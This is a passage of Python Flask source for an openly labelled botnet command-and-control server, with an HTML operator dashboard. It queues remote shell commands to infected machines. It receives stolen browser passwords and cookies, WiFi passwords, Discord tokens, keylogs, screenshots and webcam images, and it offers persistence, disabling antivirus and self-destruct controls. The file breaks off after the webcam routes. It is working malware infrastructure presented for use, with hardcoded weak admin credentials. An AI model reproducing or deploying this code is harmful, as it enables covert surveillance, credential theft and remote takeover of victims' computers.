"""
🔥 BOTNET C2 SERVER - ADVANCED EDITION
Features: Remote Shell, Screenshot, Keylogger, Browser Data, WiFi, Discord, Webcam, File Manager
"""

from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session
from functools import wraps
from datetime import datetime
import json
import os
import threading
import time

app = Flask(__name__)
app.secret_key = 'botnet_c2_secret_2024_advanced'

# ==================== AUTH ====================
ADMIN_USER = "admin"
ADMIN_PASS = "123"

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

# ==================== DATA ====================
BOTS_FILE = os.path.join(os.path.dirname(__file__), 'data', 'bots.json')
bots_data = {}
kill_list = set()
pending_commands = {}
shell_results = {}
screenshots = {}
keylogs = {}
browser_data = {}
wifi_data = {}
discord_data = {}
webcam_data = {}
files_data = {}
file_downloads = {}
# New feature storage
audio_data = {}
crypto_data = {}
email_data = {}
games_data = {}
location_data = {}
processes_data = {}
apps_data = {}
screen_data = {}
persist_data = {}
av_data = {}
bots_lock = threading.Lock()

def load_bots():
    global bots_data
    if os.path.exists(BOTS_FILE):
        try:
            with open(BOTS_FILE, 'r', encoding='utf-8') as f:
                bots_data = json.load(f)
        except:
            bots_data = {}

def save_bots():
    os.makedirs(os.path.dirname(BOTS_FILE), exist_ok=True)
    with open(BOTS_FILE, 'w', encoding='utf-8') as f:
        json.dump(bots_data, f, indent=2, ensure_ascii=False)

# ==================== LOGIN HTML ====================
LOGIN_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🔐 C2 Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #0f0f23, #1a1a3e); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .login-box { background: rgba(255,255,255,0.05); backdrop-filter: blur(20px); padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); width: 380px; text-align: center; }
        .login-box h1 { color: #fff; margin-bottom: 30px; }
        .login-box input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.2); border-radius: 10px; background: rgba(0,0,0,0.3); color: #fff; font-size: 16px; }
        .login-box button { width: 100%; padding: 15px; border: none; border-radius: 10px; background: linear-gradient(45deg, #667eea, #764ba2); color: #fff; font-size: 16px; cursor: pointer; }
        .error { background: rgba(231,76,60,0.3); color: #e74c3c; padding: 10px; border-radius: 8px; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>🔐 C2 Panel</h1>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
'''

# ==================== DASHBOARD HTML ====================
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🔥 C2 Command Center</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root { --bg: #0a0a1a; --card: rgba(255,255,255,0.03); --border: rgba(255,255,255,0.08); --accent: #6366f1; --green: #10b981; --red: #ef4444; --yellow: #f59e0b; --blue: #3b82f6; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #e2e8f0; min-height: 100vh; }
        .header { background: linear-gradient(135deg, var(--accent), #8b5cf6); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { font-size: 20px; }
        .header a { color: #fff; text-decoration: none; background: rgba(255,255,255,0.2); padding: 8px 16px; border-radius: 8px; }
        .stats { display: grid; grid-template-columns: repeat(5, 1fr); gap: 15px; padding: 15px 30px; }
        .stat { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 15px; }
        .stat h3 { color: #94a3b8; font-size: 12px; margin-bottom: 5px; }
        .stat .val { font-size: 24px; font-weight: 700; }
        .stat.on .val { color: var(--green); }
        .stat.off .val { color: var(--red); }
        .main { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 0 30px 30px; }
        .full { grid-column: 1 / -1; }
        .panel { background: var(--card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
        .panel-head { background: rgba(255,255,255,0.02); padding: 12px 15px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .panel-head h2 { font-size: 14px; }
        .panel-body { padding: 15px; max-height: 300px; overflow-y: auto; }
        .btn { padding: 6px 12px; border: none; border-radius: 6px; font-size: 12px; cursor: pointer; margin-left: 5px; }
        .btn-p { background: var(--accent); color: #fff; }
        .btn-g { background: var(--green); color: #fff; }
        .btn-r { background: var(--red); color: #fff; }
        .btn-y { background: var(--yellow); color: #000; }
        .btn-b { background: var(--blue); color: #fff; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid var(--border); }
        th { color: #94a3b8; font-weight: 500; }
        .badge { padding: 3px 10px; border-radius: 20px; font-size: 11px; }
        .badge-on { background: rgba(16,185,129,0.2); color: var(--green); }
        .badge-off { background: rgba(239,68,68,0.2); color: var(--red); }
        .terminal { background: #0d1117; border-radius: 8px; }
        .term-head { background: #161b22; padding: 8px 12px; display: flex; align-items: center; gap: 6px; }
        .dot { width: 10px; height: 10px; border-radius: 50%; }
        .term-body { padding: 12px; height: 150px; overflow-y: auto; font-family: monospace; font-size: 12px; color: #7ee787; }
        .term-input { display: flex; gap: 8px; padding: 10px; background: #161b22; }
        .term-input input { flex: 1; background: #0d1117; border: 1px solid #30363d; padding: 8px; border-radius: 5px; color: #fff; }
        .term-input select { background: #0d1117; border: 1px solid #30363d; padding: 8px; border-radius: 5px; color: #fff; }
        .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .feature-btn { background: rgba(255,255,255,0.02); border: 1px solid var(--border); border-radius: 10px; padding: 15px; text-align: center; cursor: pointer; transition: all 0.2s; }
        .feature-btn:hover { background: rgba(99,102,241,0.1); border-color: var(--accent); }
        .feature-btn .icon { font-size: 28px; margin-bottom: 8px; }
        .feature-btn h4 { font-size: 13px; margin-bottom: 3px; }
        .feature-btn p { font-size: 11px; color: #94a3b8; }
        .result-box { background: #0d1117; border-radius: 8px; padding: 12px; font-family: monospace; font-size: 11px; color: #7ee787; max-height: 200px; overflow-y: auto; white-space: pre-wrap; }
        .toast { position: fixed; bottom: 20px; right: 20px; background: var(--accent); color: #fff; padding: 12px 20px; border-radius: 8px; z-index: 1000; animation: slideIn 0.3s; }
        @keyframes slideIn { from { transform: translateX(100px); opacity: 0; } }
        .selected { background: rgba(99,102,241,0.1) !important; }
        .img-preview { max-width: 100%; border-radius: 8px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 C2 Command Center - Advanced</h1>
        <a href="/logout">Logout</a>
    </div>
    
    <div class="stats">
        <div class="stat"><h3>Total Bots</h3><div class="val" id="total">0</div></div>
        <div class="stat on"><h3>Online</h3><div class="val" id="online">0</div></div>
        <div class="stat off"><h3>Offline</h3><div class="val" id="offline">0</div></div>
        <div class="stat"><h3>Selected</h3><div class="val" id="selected" style="font-size:14px;color:var(--accent);">None</div></div>
        <div class="stat"><h3>Status</h3><div class="val" id="status" style="font-size:12px;color:#94a3b8;">Ready</div></div>
    </div>
    
    <div class="main">
        <!-- Bots Table -->
        <div class="panel full">
            <div class="panel-head">
                <h2>🤖 Connected Bots</h2>
                <div>
                    <button class="btn btn-b" onclick="loadBots()">🔄 Refresh</button>
                    <button class="btn btn-r" onclick="killAll()">💀 Kill All</button>
                </div>
            </div>
            <div class="panel-body" style="padding:0;">
                <table>
                    <thead><tr><th>Status</th><th>Bot ID</th><th>IP</th><th>OS</th><th>User</th><th>RAM</th><th>Actions</th></tr></thead>
                    <tbody id="bots-table"></tbody>
                </table>
            </div>
        </div>
        
        <!-- Quick Actions -->
        <div class="panel full">
            <div class="panel-head"><h2>⚡ Quick Actions</h2></div>
            <div class="panel-body">
                <div style="display:grid;grid-template-columns:repeat(6,1fr);gap:8px;">
                    <div class="feature-btn" onclick="takeScreenshot()"><div class="icon">📸</div><h4>Screenshot</h4></div>
                    <div class="feature-btn" onclick="captureWebcam()"><div class="icon">📷</div><h4>Webcam</h4></div>
                    <div class="feature-btn" onclick="toggleKeylogger()"><div class="icon">⌨️</div><h4>Keylogger</h4></div>
                    <div class="feature-btn" onclick="getWifi()"><div class="icon">📶</div><h4>WiFi</h4></div>
                    <div class="feature-btn" onclick="getDiscord()"><div class="icon">🎮</div><h4>Discord</h4></div>
                    <div class="feature-btn" onclick="collectBrowser()"><div class="icon">🌐</div><h4>Browser</h4></div>
                    <div class="feature-btn" onclick="recordAudio()"><div class="icon">🎤</div><h4>Audio</h4></div>
                    <div class="feature-btn" onclick="getCrypto()"><div class="icon">🔐</div><h4>Crypto</h4></div>
                    <div class="feature-btn" onclick="getEmail()"><div class="icon">📧</div><h4>Email</h4></div>
                    <div class="feature-btn" onclick="getGames()"><div class="icon">🎮</div><h4>Games</h4></div>
                    <div class="feature-btn" onclick="getLocation()"><div class="icon">📍</div><h4>Location</h4></div>
                    <div class="feature-btn" onclick="getProcesses()"><div class="icon">💻</div><h4>Processes</h4></div>
                    <div class="feature-btn" onclick="getApps()"><div class="icon">📊</div><h4>Apps</h4></div>
                    <div class="feature-btn" onclick="recordScreen()"><div class="icon">🎥</div><h4>Screen Rec</h4></div>
                    <div class="feature-btn" onclick="addPersist()"><div class="icon">🔄</div><h4>Persist+</h4></div>
                    <div class="feature-btn" onclick="removePersist()"><div class="icon">❌</div><h4>Persist-</h4></div>
                    <div class="feature-btn" onclick="disableAV()"><div class="icon">🛡️</div><h4>Disable AV</h4></div>
                    <div class="feature-btn" onclick="selfDestruct()" style="border-color:#ef4444;"><div class="icon">💣</div><h4>Destruct</h4></div>
                </div>
            </div>
        </div>
        
        <!-- Results -->
        <div class="panel">
            <div class="panel-head"><h2>📋 Results</h2><button class="btn btn-y" onclick="clearResults()">Clear</button></div>
            <div class="panel-body">
                <div class="result-box" id="results">Results will appear here...</div>
            </div>
        </div>
        
        <!-- Remote Terminal -->
        <div class="panel full">
            <div class="panel-head"><h2>💻 Remote Terminal</h2><button class="btn btn-y" onclick="clearTerm()">Clear</button></div>
            <div class="panel-body" style="padding:0;">
                <div class="terminal">
                    <div class="term-head">
                        <div class="dot" style="background:#ff5f56;"></div>
                        <div class="dot" style="background:#ffbd2e;"></div>
                        <div class="dot" style="background:#27ca40;"></div>
                        <span style="color:#94a3b8;margin-left:10px;" id="term-title">Select a bot</span>
                    </div>
                    <div class="term-body" id="term-output"></div>
                    <div class="term-input">
                        <select id="shell"><option value="powershell">PowerShell</option><option value="cmd">CMD</option></select>
                        <input type="text" id="cmd" placeholder="Enter command..." onkeypress="if(event.key==='Enter')sendCmd()">
                        <button class="btn btn-p" onclick="sendCmd()">Run</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Screenshot/Webcam Preview -->
        <div class="panel">
            <div class="panel-head"><h2>🖼️ Preview</h2></div>
            <div class="panel-body" style="text-align:center;">
                <div id="preview-area" style="color:#94a3b8;">No image captured yet</div>
            </div>
        </div>
        
        <!-- Keylogger -->
        <div class="panel">
            <div class="panel-head"><h2>⌨️ Keylogger Output</h2><span id="keylog-status" style="color:#94a3b8;">⚪ Idle</span></div>
            <div class="panel-body">
                <div class="result-box" id="keylog-output">Keys will appear here...</div>
            </div>
        </div>
    </div>
    
    <script>
        let botsData = {}, selectedBot = null, keyloggerOn = false, keylogInterval = null;
        
        function toast(msg) { const t = document.createElement('div'); t.className = 'toast'; t.textContent = msg; document.body.appendChild(t); setTimeout(() => t.remove(), 3000); }
        function setStatus(msg) { document.getElementById('status').textContent = msg; }
        
        async function loadBots() {
            const res = await fetch('/api/bots');
            botsData = await res.json();
            const bots = Object.entries(botsData);
            let on = 0, off = 0;
            const tbody = document.getElementById('bots-table');
            if (bots.length === 0) {
                tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:#94a3b8;">No bots connected</td></tr>';
            } else {
                tbody.innerHTML = bots.map(([id, b]) => {
                    const isOn = (new Date() - new Date(b.last_seen)) < 30000;
                    isOn ? on++ : off++;
                    const sel = id === selectedBot ? 'selected' : '';
                    return `<tr class="${sel}">
                        <td><span class="badge ${isOn ? 'badge-on' : 'badge-off'}">${isOn ? '● ON' : '○ OFF'}</span></td>
                        <td>${id.substring(0,8)}...</td>
                        <td>${b.public_ip || b.local_ip}</td>
                        <td>${b.os || '-'}</td>
                        <td>${b.username}</td>
                        <td>${b.ram_total}</td>
                        <td>
                            <button class="btn btn-p" onclick="selectBot('${id}')">Select</button>
                            <button class="btn btn-r" onclick="killBot('${id}')">Kill</button>
                        </td>
                    </tr>`;
                }).join('');
            }
            document.getElementById('total').textContent = bots.length;
            document.getElementById('online').textContent = on;
            document.getElementById('offline').textContent = off;
        }
        
        function selectBot(id) {
            selectedBot = id;
            const b = botsData[id];
            document.getElementById('selected').textContent = b.username + '@' + b.computer_name;
            document.getElementById('term-title').textContent = b.username + '@' + b.computer_name;
            loadBots();
            toast('Selected: ' + id.substring(0, 8));
        }
        
        async function killBot(id) { if (confirm('Kill bot?')) { await fetch(`/api/bot/${id}/kill`, {method:'POST'}); toast('Kill sent'); loadBots(); } }
        async function killAll() { if (confirm('Kill ALL?')) { await fetch('/api/bots/kill-all', {method:'POST'}); toast('Kill all sent'); loadBots(); } }
        
        // Terminal
        async function sendCmd() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            const cmd = document.getElementById('cmd').value.trim();
            if (!cmd) return;
            const shell = document.getElementById('shell').value;
            document.getElementById('term-output').innerHTML += `<div style="color:#58a6ff;">$ ${cmd}</div>`;
            document.getElementById('cmd').value = '';
            setStatus('Sending command...');
            await fetch(`/api/bot/${selectedBot}/shell`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({command:cmd, shell_type:shell})});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/results`);
                const data = await res.json();
                data.forEach(r => { document.getElementById('term-output').innerHTML += `<div>${r.result?.output || 'No output'}</div>`; });
                document.getElementById('term-output').scrollTop = 999999;
                setStatus('Ready');
            }, 3000);
        }
        function clearTerm() { document.getElementById('term-output').innerHTML = ''; }
        
        // Screenshot
        async function takeScreenshot() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Capturing screenshot...');
            await fetch(`/api/bot/${selectedBot}/screenshot`, {method:'POST'});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/screenshot/get`);
                const data = await res.json();
                if (data.image) {
                    document.getElementById('preview-area').innerHTML = `<img src="data:image/jpeg;base64,${data.image}" class="img-preview">`;
                    toast('Screenshot captured!');
                }
                setStatus('Ready');
            }, 3000);
        }
        
        // Webcam
        async function captureWebcam() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Capturing webcam...');
            await fetch(`/api/bot/${selectedBot}/webcam`, {method:'POST'});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/webcam/get`);
                const data = await res.json();
                if (data.image) {
                    document.getElementById('preview-area').innerHTML = `<img src="data:image/jpeg;base64,${data.image}" class="img-preview">`;
                    toast('Webcam captured!');
                }
                setStatus('Ready');
            }, 5000);
        }
        
        // Keylogger
        async function toggleKeylogger() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            if (!keyloggerOn) {
                await fetch(`/api/bot/${selectedBot}/keylogger/start`, {method:'POST'});
                document.getElementById('keylog-status').textContent = '🟢 Recording';
                keyloggerOn = true;
                if (keylogInterval) clearInterval(keylogInterval);
                keylogInterval = setInterval(fetchKeylogs, 5000);
                toast('Keylogger started');
            } else {
                await fetch(`/api/bot/${selectedBot}/keylogger/stop`, {method:'POST'});
                document.getElementById('keylog-status').textContent = '⚪ Stopped';
                keyloggerOn = false;
                if (keylogInterval) clearInterval(keylogInterval);
                toast('Keylogger stopped');
            }
        }
        async function fetchKeylogs() {
            if (!selectedBot) return;
            await fetch(`/api/bot/${selectedBot}/keylogger/get`, {method:'POST'});
            await new Promise(r => setTimeout(r, 2000));
            const res = await fetch(`/api/bot/${selectedBot}/keylogs`);
            const data = await res.json();
            if (data.text) {
                document.getElementById('keylog-output').textContent += data.text;
                document.getElementById('keylog-output').scrollTop = 999999;
            }
        }
        
        // WiFi
        async function getWifi() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Getting WiFi passwords...');
            await fetch(`/api/bot/${selectedBot}/wifi`, {method:'POST'});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/wifi/get`);
                const data = await res.json();
                if (data.data) {
                    document.getElementById('results').textContent = JSON.stringify(data.data, null, 2);
                    toast('WiFi data received!');
                }
                setStatus('Ready');
            }, 3000);
        }
        
        // Discord
        async function getDiscord() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Getting Discord tokens...');
            await fetch(`/api/bot/${selectedBot}/discord`, {method:'POST'});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/discord/get`);
                const data = await res.json();
                if (data.data) {
                    document.getElementById('results').textContent = JSON.stringify(data.data, null, 2);
                    toast('Discord tokens received!');
                }
                setStatus('Ready');
            }, 3000);
        }
        
        // Browser
        async function collectBrowser() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Collecting browser data...');
            await fetch(`/api/bot/${selectedBot}/browser/collect`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({types:['cookies','passwords','history']})});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/browser/data`);
                const data = await res.json();
                if (data && Object.keys(data).length > 0) {
                    document.getElementById('results').textContent = JSON.stringify(data, null, 2);
                    toast('Browser data received!');
                }
                setStatus('Ready');
            }, 5000);
        }
        
        // Audio Recording
        async function recordAudio() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Recording audio (10s)...');
            await fetch(`/api/bot/${selectedBot}/audio`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({duration:10})});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/audio/get`);
                const data = await res.json();
                if (data.data?.success) { toast('Audio recorded!'); document.getElementById('results').textContent = 'Audio recorded successfully! (Base64 data received)'; }
                setStatus('Ready');
            }, 15000);
        }
        
        // Crypto Wallets
        async function getCrypto() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Getting crypto wallets...');
            await fetch(`/api/bot/${selectedBot}/crypto`, {method:'POST'});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/crypto/get`);
                const data = await res.json();
                if (data.data) { document.getElementById('results').textContent = JSON.stringify(data.data, null, 2); toast('Crypto wallets received!'); }
                setStatus('Ready');
            }, 3000);
        }
        
        // Email Data
        async function getEmail() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Getting email data...');
            await fetch(`/api/bot/${selectedBot}/email`, {method:'POST'});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/email/get`);
                const data = await res.json();
                if (data.data) { document.getElementById('results').textContent = JSON.stringify(data.data, null, 2); toast('Email data received!'); }
                setStatus('Ready');
            }, 3000);
        }
        
        // Game Accounts
        async function getGames() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Getting game accounts...');
            await fetch(`/api/bot/${selectedBot}/games`, {method:'POST'});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/games/get`);
                const data = await res.json();
                if (data.data) { document.getElementById('results').textContent = JSON.stringify(data.data, null, 2); toast('Game accounts received!'); }
                setStatus('Ready');
            }, 3000);
        }
        
        // Location
        async function getLocation() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Getting location...');
            await fetch(`/api/bot/${selectedBot}/location`, {method:'POST'});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/location/get`);
                const data = await res.json();
                if (data.data) { document.getElementById('results').textContent = JSON.stringify(data.data, null, 2); toast('Location received!'); }
                setStatus('Ready');
            }, 3000);
        }
        
        // Process Manager
        async function getProcesses() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Getting processes...');
            await fetch(`/api/bot/${selectedBot}/processes`, {method:'POST'});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/processes/get`);
                const data = await res.json();
                if (data.data?.processes) { document.getElementById('results').textContent = JSON.stringify(data.data.processes.slice(0,50), null, 2); toast('Processes received!'); }
                setStatus('Ready');
            }, 3000);
        }
        
        // Installed Apps
        async function getApps() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Getting installed apps...');
            await fetch(`/api/bot/${selectedBot}/apps`, {method:'POST'});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/apps/get`);
                const data = await res.json();
                if (data.data?.apps) { document.getElementById('results').textContent = JSON.stringify(data.data.apps.slice(0,30), null, 2); toast('Apps received!'); }
                setStatus('Ready');
            }, 3000);
        }
        
        // Screen Recording
        async function recordScreen() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Recording screen (10s)...');
            await fetch(`/api/bot/${selectedBot}/screen`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({duration:10,fps:5})});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/screen/get`);
                const data = await res.json();
                if (data.data?.success) { toast('Screen recorded!'); document.getElementById('results').textContent = 'Screen recorded! (Video data received)'; }
                setStatus('Ready');
            }, 20000);
        }
        
        // Persistence
        async function addPersist() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Adding persistence...');
            await fetch(`/api/bot/${selectedBot}/persist/add`, {method:'POST'});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/persist/get`);
                const data = await res.json();
                if (data.data) { document.getElementById('results').textContent = JSON.stringify(data.data, null, 2); toast('Persistence added!'); }
                setStatus('Ready');
            }, 3000);
        }
        async function removePersist() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            setStatus('Removing persistence...');
            await fetch(`/api/bot/${selectedBot}/persist/remove`, {method:'POST'});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/persist/get`);
                const data = await res.json();
                if (data.data) { document.getElementById('results').textContent = JSON.stringify(data.data, null, 2); toast('Persistence removed!'); }
                setStatus('Ready');
            }, 3000);
        }
        
        // Disable AV
        async function disableAV() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            if (!confirm('Disable Windows Defender? (Requires Admin)')) return;
            setStatus('Disabling antivirus...');
            await fetch(`/api/bot/${selectedBot}/av/disable`, {method:'POST'});
            setTimeout(async () => {
                const res = await fetch(`/api/bot/${selectedBot}/av/get`);
                const data = await res.json();
                if (data.data) { document.getElementById('results').textContent = JSON.stringify(data.data, null, 2); toast('AV disable attempted!'); }
                setStatus('Ready');
            }, 5000);
        }
        
        // Self Destruct
        async function selfDestruct() {
            if (!selectedBot) { toast('Select a bot!'); return; }
            if (!confirm('⚠️ SELF-DESTRUCT? This will delete the bot permanently!')) return;
            if (!confirm('Are you REALLY sure?')) return;
            setStatus('Self-destructing...');
            await fetch(`/api/bot/${selectedBot}/destruct`, {method:'POST'});
            toast('Self-destruct command sent!');
            setStatus('Ready');
            loadBots();
        }
        
        function clearResults() { document.getElementById('results').textContent = 'Results will appear here...'; }
        
        loadBots();
        setInterval(loadBots, 5000);
    </script>
</body>
</html>
'''

# ==================== ROUTES ====================

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form['username'] == ADMIN_USER and request.form['password'] == ADMIN_PASS:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        error = 'Invalid credentials'
    return render_template_string(LOGIN_HTML, error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/bots')
@login_required
def get_bots():
    return jsonify(bots_data)

# ==================== BOT ENDPOINTS ====================

@app.route('/api/bot/register', methods=['POST'])
def register_bot():
    data = request.get_json()
    bot_id = data.get('bot_id')
    if bot_id:
        with bots_lock:
            data['first_seen'] = datetime.now().isoformat()
            data['last_seen'] = datetime.now().isoformat()
            bots_data[bot_id] = data
            save_bots()
        return jsonify({'status': 'registered'})
    return jsonify({'error': 'Missing bot_id'}), 400

@app.route('/api/bot/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    bot_id = data.get('bot_id')
    if not bot_id:
        return jsonify({'error': 'Missing bot_id'}), 400
    
    response = {'status': 'ok'}
    with bots_lock:
        if bot_id in kill_list:
            kill_list.discard(bot_id)
            return jsonify({'status': 'ok', 'command': 'kill'})
        
        if bot_id in pending_commands:
            response.update(pending_commands.pop(bot_id))
        
        if bot_id in bots_data:
            bots_data[bot_id].update(data)
            bots_data[bot_id]['last_seen'] = datetime.now().isoformat()
        else:
            data['first_seen'] = datetime.now().isoformat()
            data['last_seen'] = datetime.now().isoformat()
            bots_data[bot_id] = data
        save_bots()
    
    return jsonify(response)

@app.route('/api/bot/<bot_id>/kill', methods=['POST'])
@login_required
def kill_bot(bot_id):
    kill_list.add(bot_id)
    return jsonify({'status': 'queued'})

@app.route('/api/bots/kill-all', methods=['POST'])
@login_required
def kill_all():
    for bot_id in bots_data.keys():
        kill_list.add(bot_id)
    return jsonify({'status': 'queued'})

# Shell
@app.route('/api/bot/<bot_id>/shell', methods=['POST'])
@login_required
def send_shell(bot_id):
    data = request.get_json()
    pending_commands[bot_id] = {'command': 'shell', 'shell_command': data.get('command'), 'shell_type': data.get('shell_type', 'powershell')}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/shell_result', methods=['POST'])
def receive_shell():
    data = request.get_json()
    bot_id = data.get('bot_id')
    if bot_id not in shell_results:
        shell_results[bot_id] = []
    shell_results[bot_id].append(data)
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/results')
@login_required
def get_results(bot_id):
    results = shell_results.pop(bot_id, [])
    return jsonify(results)

# Screenshot
@app.route('/api/bot/<bot_id>/screenshot', methods=['POST'])
@login_required
def req_screenshot(bot_id):
    pending_commands[bot_id] = {'command': 'screenshot'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/screenshot', methods=['POST'])
def recv_screenshot():
    data = request.get_json()
    screenshots[data['bot_id']] = {'image': data['image'], 'timestamp': data['timestamp']}
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/screenshot/get')
@login_required
def get_screenshot(bot_id):
    return jsonify(screenshots.pop(bot_id, {}))

# Keylogger
@app.route('/api/bot/<bot_id>/keylogger/start', methods=['POST'])
@login_required
def start_keylogger(bot_id):
    pending_commands[bot_id] = {'command': 'start_keylogger'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/<bot_id>/keylogger/stop', methods=['POST'])
@login_required
def stop_keylogger(bot_id):
    pending_commands[bot_id] = {'command': 'stop_keylogger'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/<bot_id>/keylogger/get', methods=['POST'])
@login_required
def req_keylogs(bot_id):
    pending_commands[bot_id] = {'command': 'get_keylogs'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/<bot_id>/keylogs')
@login_required
def get_keylogs(bot_id):
    return jsonify(keylogs.pop(bot_id, {}))

@app.route('/api/bot/keylogs', methods=['POST'])
def recv_keylogs():
    data = request.get_json()
    keylogs[data['bot_id']] = {'keys': data.get('keys'), 'text': data.get('text')}
    return jsonify({'status': 'ok'})

# Browser
@app.route('/api/bot/<bot_id>/browser/collect', methods=['POST'])
@login_required
def req_browser(bot_id):
    data = request.get_json()
    pending_commands[bot_id] = {'command': 'collect_browser', 'types': data.get('types', [])}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/browser', methods=['POST'])
def recv_browser():
    data = request.get_json()
    browser_data[data['bot_id']] = data.get('data', {})
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/browser/data')
@login_required
def get_browser(bot_id):
    return jsonify(browser_data.pop(bot_id, {}))

# WiFi
@app.route('/api/bot/<bot_id>/wifi', methods=['POST'])
@login_required
def req_wifi(bot_id):
    pending_commands[bot_id] = {'command': 'wifi_passwords'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/wifi', methods=['POST'])
def recv_wifi():
    data = request.get_json()
    wifi_data[data['bot_id']] = {'data': data.get('data', [])}
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/wifi/get')
@login_required
def get_wifi(bot_id):
    return jsonify(wifi_data.pop(bot_id, {}))

# Discord
@app.route('/api/bot/<bot_id>/discord', methods=['POST'])
@login_required
def req_discord(bot_id):
    pending_commands[bot_id] = {'command': 'discord_tokens'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/discord', methods=['POST'])
def recv_discord():
    data = request.get_json()
    discord_data[data['bot_id']] = {'data': data.get('data', [])}
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/discord/get')
@login_required
def get_discord(bot_id):
    return jsonify(discord_data.pop(bot_id, {}))

# Webcam
@app.route('/api/bot/<bot_id>/webcam', methods=['POST'])
@login_required
def req_webcam(bot_id):
    pending_commands[bot_id] = {'command': 'webcam'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/webcam', methods=['POST'])
def recv_webcam():
    data = request.get_json()
    webcam_data[data['bot_id']] = {'image': data.get('image'), 'timestamp': data.get('timestamp')}
    return jsonify({'status': 'ok'})

